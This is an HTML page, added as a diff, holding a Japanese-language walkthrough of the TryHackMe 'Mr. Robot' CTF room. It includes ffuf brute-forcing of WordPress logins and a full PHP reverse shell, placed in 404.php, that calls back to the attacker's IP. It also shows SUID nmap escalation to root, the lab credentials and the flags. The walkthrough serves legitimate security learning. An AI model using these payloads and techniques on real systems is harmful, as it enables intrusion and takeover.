@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Mr. Robot Writeup</title>
+  <link rel="stylesheet" href="assets/writeup.css">
+</head>
+<body>
+  <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
+
+  <header class="hero">
+    <h1>Mr. Robot</h1>
+    <p>WordPress（Mr. Robot テーマ）、robots.txt、ハッシュクラック、権限昇格。</p>
+    <div class="badges">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Medium</span>
+      <span class="badge">Language: 日本語</span>
+      <span class="badge">Target: Linux</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
+      許可されたラボ環境での学習目的でのみご利用ください。
+    </div>
+    
+    <article class="writeup-body">
+      <pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nmap 10.48.189.70 -p- -sCV -T4 
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-27 14:22 +0900
+Nmap scan report for 10.48.189.70
+Host is up (0.13s latency).
+Not shown: 65532 filtered tcp ports (no-response)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b8:8d:4a:90:14:af:d7:42:a0:ae:d0:7e:e6:bb:d4:01 (RSA)
+|   256 f0:c3:8a:ae:dc:65:92:bd:0f:75:ad:11:b3:14:d0:2b (ECDSA)
+|_  256 59:27:55:47:3d:1a:2c:a3:15:ee:2b:90:44:36:12:e7 (ED25519)
+80/tcp  open  http     Apache httpd
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open  ssl/http Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+|_ssl-date: TLS randomness does not represent time
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 178.26 seconds
+</code></pre>
+<p>webページとsshのシンプルな構成</p>
+<p>whoismrrobot.com<br>
+<img alt="Pasted image 20260527145814" src="mr-robot/images/01-Pasted-image-20260527145814.png"><br>
+コマンドをうつと画像が出るのでそれを解析できそう</p>
+<p>feroxbusterも回して見たところ数十個ヒットした</p>
+<p><img alt="Pasted image 20260527150439" src="mr-robot/images/02-Pasted-image-20260527150439.png"></p>
+<p>ふと思い出してrobots.txtをみたところ情報が落ちていた<br>
+<img alt="Pasted image 20260527152505" src="mr-robot/images/03-Pasted-image-20260527152505.png"><br>
+<code>fsocity.dic</code>と<code>key-1-of-3.txt</code></p>
+<p>wpscanの結果バージョンは<code>4.3.1</code>であると特定<br>
+wpscanの結果を貼っておく</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrRobot]
+└─$ wpscan --url http://10.48.163.213                             
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://10.48.163.213/ [10.48.163.213]
+[+] Started: Wed May 27 15:10:34 2026
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache
+ |  - X-Mod-Pagespeed: 1.9.32.3-4523
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://10.48.163.213/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.48.163.213/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] The external WP-Cron seems to be enabled: http://10.48.163.213/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.48.163.213/610578d.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.48.163.213/610578d.html, Match: 'WordPress 4.3.1'
+
+[+] WordPress theme in use: twentyfifteen
+ | Location: http://10.48.163.213/wp-content/themes/twentyfifteen/
+ | Latest Version: 4.2
+ | Last Updated: 2026-05-20T00:00:00.000Z
+ | Readme: http://10.48.163.213/wp-content/themes/twentyfifteen/readme.txt
+ | Style URL: http://10.48.163.213/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
+ |
+ | Found By: Css Style In 404 Page (Passive Detection)
+ |
+ | The version could not be determined.
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:09:53 &lt;=================&gt; (137 / 137) 100.00% Time: 00:09:53
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed May 27 15:31:28 2026
+[+] Requests Done: 190
+[+] Cached Requests: 5
+[+] Data Sent: 55.469 KB
+[+] Data Received: 23.425 MB
+[+] Memory used: 261.746 MB
+[+] Elapsed time: 00:20:53
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrRobot]
+└─$ 
+
+</code></pre>
+<p>feroxの結果から（まだ途中だけど）<br>
+/admin/robotっていうのが怪しいと思ったのでアクセスしたらrobot.gzをDLさせられた</p>
+<p>まずgunzipしようとしたら違うファイルだった</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$ gunzip robot.gz
+
+gzip: robot.gz: not in gzip format
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$ file robot.gz                                     
+robot.gz: bzip2 compressed data, block size = 900k
+</code></pre>
+<p>つぎにbunzip2したらtarアーカイブが出てきた</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$ bunzip2 robot.gz                   
+bunzip2: Can't guess original name for robot.gz -- using robot.gz.out
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$ ls
+fsociety  inform  join  prepare  question  robot.gz.out  wakeup
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$ file robot.gz.out 
+robot.gz.out: POSIX tar archive (GNU)
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$ 
+</code></pre>
+<p>tarを展開したらhtmlサイトのセットが出てきた</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$ tar -xf robot.gz.out                          
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$ ls
+fsociety  inform  join  prepare  question  robot.com  robot.gz.out  wakeup
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$ ls robot.com     
+audio  css  images  index.html  intro.webm  js  robots.txt  video
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$ cd robot.com               
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot/robot.com]
+└─$ cat robots.txt 
+# robotstxt.org/
+
+User-agent: * 
+Disallow:
+</code></pre>
+<p>中を見るとhttp://[target ip]でアクセスしたときに見れる画像たちが入っているようだ</p>
+<p>さっき得た/fsocity.dicに入るとワードリストを得た<br>
+/key-1-of-3.txtに入ると<code>073403c8a58a1f80d943455fb30724b9</code>を得た<br>
+これ何文字？32文字らしい<br>
+ってことはmd5で<br>
+これをjohnで解析？<br>
+ワードリストにさっきのやつを使う</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$ john hash.txt --wordlist=fsocity.dic --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:00 DONE (2026-05-27 15:52) 0g/s 12258Kp/s 12258Kc/s 12258KC/s 8output..ABCDEFGHIJKLMNOPQRSTUVWXYZ
+Session completed. 
+
+</code></pre>
+<p>なんかいろいろ調べてたら<br>
+これが答えの1個目だった</p>
+<p>つぎに`/wp-login.php'にアクセスした<br>
+<img alt="Pasted image 20260527160401" src="mr-robot/images/04-Pasted-image-20260527160401.png"><br>
+admin:adminではusernameが違うとのエラーが出た<br>
+存在するusernameを入れたら違うエラー文言が出そうだ</p>
+<p><code>/fsocity.dic</code>に入っていたデータをワードリストとして<code>ffuf</code>した<br>
+パスワードは<code>test</code>で固定している</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$   ffuf -u http://10.48.163.213/wp-login.php -X POST \
+    -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+    -b &quot;wordpress_test_cookie=WP Cookie check&quot; \
+    -d &quot;log=FUZZ&amp;pwd=test&amp;wp-submit=Log+In&amp;testcookie=1&quot; \
+    -w fsocity.unique.dic \
+    -mr &quot;password you entered&quot; \
+    -t 40 -timeout 15
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://10.48.163.213/wp-login.php
+ :: Wordlist         : FUZZ: /home/rkametani/tryhackme/mrrobot/fsocity.unique.dic
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Header           : Cookie: wordpress_test_cookie=WP Cookie check
+ :: Data             : log=FUZZ&amp;pwd=test&amp;wp-submit=Log+In&amp;testcookie=1
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 15
+ :: Threads          : 40
+ :: Matcher          : Regexp: password you entered
+________________________________________________
+
+ELLIOT                  [Status: 200, Size: 3651, Words: 144, Lines: 59, Duration: 283ms]
+Elliot                  [Status: 200, Size: 3651, Words: 144, Lines: 59, Duration: 303ms]
+elliot                  [Status: 200, Size: 3651, Words: 144, Lines: 59, Duration: 360ms]
+:: Progress: [11451/11451] :: Job [1/1] :: 125 req/sec :: Duration: [0:01:28] :: Errors: 0 ::
+
+</code></pre>
+<p><code>ELLIOT</code>,<code>Elliot</code>,<code>elliot</code>のときに普段と異なるエラーが出た</p>
+<p>つぎはusernameを<code>elliot</code>に固定してパスワードを探す<br>
+ワードリストは<code>/fsocity.dic</code>から得たワードリストを指定する</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$   ffuf -u http://10.48.163.213/wp-login.php -X POST \          
+    -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \
+    -b &quot;wordpress_test_cookie=WP Cookie check&quot; \
+    -d &quot;log=elliot&amp;pwd=FUZZ&amp;wp-submit=Log+In&amp;testcookie=1&quot; \
+    -w fsocity.unique.dic \
+    -fr &quot;password you entered&quot; \
+    -t 40 -timeout 15
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://10.48.163.213/wp-login.php
+ :: Wordlist         : FUZZ: /home/rkametani/tryhackme/mrrobot/fsocity.unique.dic
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Header           : Cookie: wordpress_test_cookie=WP Cookie check
+ :: Data             : log=elliot&amp;pwd=FUZZ&amp;wp-submit=Log+In&amp;testcookie=1
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 15
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Regexp: password you entered
+________________________________________________
+
+ER28-0652               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 335ms]
+:: Progress: [11451/11451] :: Job [1/1] :: 121 req/sec :: Duration: [0:01:35] :: Errors: 0 ::
+
+</code></pre>
+<p><code>ER28-0652</code>がヒットした</p>
+<p><img alt="Pasted image 20260528082827" src="mr-robot/images/05-Pasted-image-20260528082827.png"><br>
+ログインに成功した</p>
+<p>つぎのような画像ファイルを見つけた<br>
+<img alt="Pasted image 20260528083433" src="mr-robot/images/06-Pasted-image-20260528083433.png"><br>
+<code>Dylan_2791</code>を見つけた<br>
+ファイル名は<code>72B3PJh</code>だ</p>
+<p>つぎにappearance -&gt; editorからphpファイルが編集できたので<br>
+<code>404.php</code>や<code>footer.php</code>などのファイルを編集してみた<br>
+<img alt="Pasted image 20260528085437" src="mr-robot/images/07-Pasted-image-20260528085437.png"><br>
+ここに任意シェルを打ちたい</p>
+<p>一応元の404.phpを残しておく</p>
+<pre><code class="language-php">&lt;?php
+/**
+ * The template for displaying 404 pages (not found)
+ *
+ * @package WordPress
+ * @subpackage Twenty_Fifteen
+ * @since Twenty Fifteen 1.0
+ */
+
+get_header(); ?&gt;
+
+
+    &lt;div id=&quot;primary&quot; class=&quot;content-area&quot;&gt;
+        &lt;main id=&quot;main&quot; class=&quot;site-main&quot; role=&quot;main&quot;&gt;
+
+            &lt;section class=&quot;error-404 not-found&quot;&gt;
+                &lt;header class=&quot;page-header&quot;&gt;
+                    &lt;h1 class=&quot;page-title&quot;&gt;&lt;?php _e( 'Oooooooooops! That page can&amp;rsquo;t be found.', 'twentyfifteen' ); ?&gt;&lt;/h1&gt;
+                &lt;/header&gt;&lt;!-- .page-header --&gt;
+
+                &lt;div class=&quot;page-content&quot;&gt;
+                    &lt;p&gt;&lt;?php _e( 'It looks like nothing was found at this location. Maybe try a search?', 'twentyfifteen' ); ?&gt;&lt;/p&gt;
+
+                    &lt;?php get_search_form(); ?&gt;
+                &lt;/div&gt;&lt;!-- .page-content --&gt;
+            &lt;/section&gt;&lt;!-- .error-404 --&gt;
+
+        &lt;/main&gt;&lt;!-- .site-main --&gt;
+    &lt;/div&gt;&lt;!-- .content-area --&gt;
+
+&lt;?php get_footer(); ?&gt;
+</code></pre>
+<p>これをrevshell.comで作成したphpに変更する</p>
+<pre><code class="language-php">&lt;?php
+// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+
+set_time_limit (0);
+$VERSION = &quot;1.0&quot;;
+$ip = '192.168.205.211';
+$port = 4444;
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; bash -i';
+$daemon = 0;
+$debug = 0;
+
+if (function_exists('pcntl_fork')) {
+    $pid = pcntl_fork();
+
+    if ($pid == -1) {
+        printit(&quot;ERROR: Can't fork&quot;);
+        exit(1);
+    }
+
+    if ($pid) {
+        exit(0);  // Parent exits
+    }
+    if (posix_setsid() == -1) {
+        printit(&quot;Error: Can't setsid()&quot;);
+        exit(1);
+    }
+
+    $daemon = 1;
+} else {
+    printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);
+}
+
+chdir(&quot;/&quot;);
+
+umask(0);
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+    printit(&quot;$errstr ($errno)&quot;);
+    exit(1);
+}
+
+$descriptorspec = array(
+   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from
+   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to
+   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+    printit(&quot;ERROR: Can't spawn shell&quot;);
+    exit(1);
+}
+
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);
+
+while (1) {
+    if (feof($sock)) {
+        printit(&quot;ERROR: Shell connection terminated&quot;);
+        break;
+    }
+
+    if (feof($pipes[1])) {
+        printit(&quot;ERROR: Shell process terminated&quot;);
+        break;
+    }
+
+    $read_a = array($sock, $pipes[1], $pipes[2]);
+    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+    if (in_array($sock, $read_a)) {
+        if ($debug) printit(&quot;SOCK READ&quot;);
+        $input = fread($sock, $chunk_size);
+        if ($debug) printit(&quot;SOCK: $input&quot;);
+        fwrite($pipes[0], $input);
+    }
+
+    if (in_array($pipes[1], $read_a)) {
+        if ($debug) printit(&quot;STDOUT READ&quot;);
+        $input = fread($pipes[1], $chunk_size);
+        if ($debug) printit(&quot;STDOUT: $input&quot;);
+        fwrite($sock, $input);
+    }
+
+    if (in_array($pipes[2], $read_a)) {
+        if ($debug) printit(&quot;STDERR READ&quot;);
+        $input = fread($pipes[2], $chunk_size);
+        if ($debug) printit(&quot;STDERR: $input&quot;);
+        fwrite($sock, $input);
+    }
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+function printit ($string) {
+    if (!$daemon) {
+        print &quot;$string\n&quot;;
+    }
+}
+
+?&gt;
+</code></pre>
+<p>うまくいった</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$ nc -lvnp 4444               
+listening on [any] 4444 ...
+connect to [192.168.205.211] from (UNKNOWN) [10.48.169.47] 60004
+Linux ip-10-48-169-47 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 00:02:42 up 40 min,  0 users,  load average: 0.20, 0.55, 0.41
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+bash: cannot set terminal process group (6488): Inappropriate ioctl for device
+bash: no job control in this shell
+daemon@ip-10-48-169-47:/$ pwd
+pwd
+/
+daemon@ip-10-48-169-47:/$ id
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+</code></pre>
+<p>入れたがflagを見る権限がない</p>
+<pre><code class="language-bash">daemon@ip-10-48-169-47:/$ find / -name key-*-of-3.txt 2&gt;/dev/null            
+find / -name key-*-of-3.txt 2&gt;/dev/null
+/opt/bitnami/apps/wordpress/htdocs/key-1-of-3.txt
+/home/robot/key-2-of-3.txt
+daemon@ip-10-48-169-47:/$ cat /home/robot/key-2-of-3.txt
+cat /home/robot/key-2-of-3.txt
+cat: /home/robot/key-2-of-3.txt: Permission denied
+daemon@ip-10-48-169-47:/$ 
+</code></pre>
+<p>しかし</p>
+<pre><code class="language-bash">daemon@ip-10-48-169-47:/$ ls /home
+ls /home
+robot
+ubuntu
+daemon@ip-10-48-169-47:/$ 
+</code></pre>
+<p><code>robot</code>と<code>ubuntu</code>というユーザーの存在を見つけた<br>
+sshログイン試行してみる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/mrrobot]
+└─$ ssh robot@10.48.169.47                     
+The authenticity of host '10.48.169.47 (10.48.169.47)' can't be established.
+ED25519 key fingerprint is: SHA256:2L45IgzWFbT9Xf8lPZ+yMxT4KfcGcCEIaokbWu9iMi8
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.48.169.47' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+robot@10.48.169.47's password: 
+Permission denied, please try again.
+robot@10.48.169.47's password: 
+Permission denied, please try again.
+robot@10.48.169.47's password: 
+</code></pre>
+<p>失敗した失敗した失敗した</p>
+<p>daemonに戻ってSUIDがついてるやつがいないか探す</p>
+<pre><code class="language-bash">daemon@ip-10-48-169-47:/$ find / -perm -4000 2&gt;/dev/null
+find / -perm -4000 2&gt;/dev/null
+/bin/umount
+/bin/mount
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+daemon@ip-10-48-169-47:/$
+</code></pre>
+<p>nmapってroot権限とか絡む話あるっけ？<br>
+ということでGTOBinsに行ってみる<br>
+<code>--interactive</code>でコマンドが打てるようになるらしい</p>
+<pre><code class="language-bash">daemon@ip-10-48-141-220:/$ /usr/local/bin/nmap
+/usr/local/bin/nmap
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+nmap&gt; !/bin/sh
+sh: 1: !/bin/sh: not found
+nmap&gt; !sh
+pwd
+/
+id
+uid=0(root) gid=0(root) groups=0(root),1(daemon)
+</code></pre>
+<p>入れた</p>
+<pre><code class="language-bash">cd /home/robot
+pwd
+/home/robot
+ls
+key-2-of-3.txt
+password.raw-md5
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+
+</code></pre>
+<p>2つ目のflagをゲットした</p>
+<p>もう１つのファイルの<code>password.raw-md5</code>は</p>
+<pre><code class="language-bash">robot:c3fcd3d76192e4007dfb496cca67e13b
+</code></pre>
+<p>という中身でありこれはcrackstationにかけると<br>
+<code>abcdefghijklmnopqrstuvwxyz</code>をmd5エンコードしたものであった</p>
+<p>てか、ん？</p>
+<p>なんかおかしいな</p>
+<p>もうroot入れてるのにrobotのクレデンシャル？<br>
+いったんssh接続試みる</p>
+<pre><code class="language-bash">$ id
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+$ 
+</code></pre>
+<p>入れた<br>
+けどこれ順番前後しちゃった<br>
+本来はここでSUID検索してdaemon-&gt;robot-&gt;rootの権限昇格だったはずが<br>
+daemon-&gt;rootしてしまった</p>
+<pre><code class="language-bash">ls -la /home/robot
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 4 root  root  4096 Jun  2  2025 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+
+</code></pre>
+<p>その証拠に<code>password.raw-md5</code>はdaemonでも見れるようになっている</p>
+<p>ということでrootのシェルに戻り<code>/root</code>を探す</p>
+<pre><code class="language-bash">whoami 
+root
+cd /root
+ls
+firstboot_done
+key-3-of-3.txt
+cat firstboot_done
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+</code></pre>
+<p>おわり</p>
+    </article>
+  </main>
+
+  <footer>
+    <p>Educational CTF writeup for <a href="https://tryhackme.com/room/mrrobot">https://tryhackme.com/room/mrrobot</a></p>
+  </footer>
+</body>
+</html>
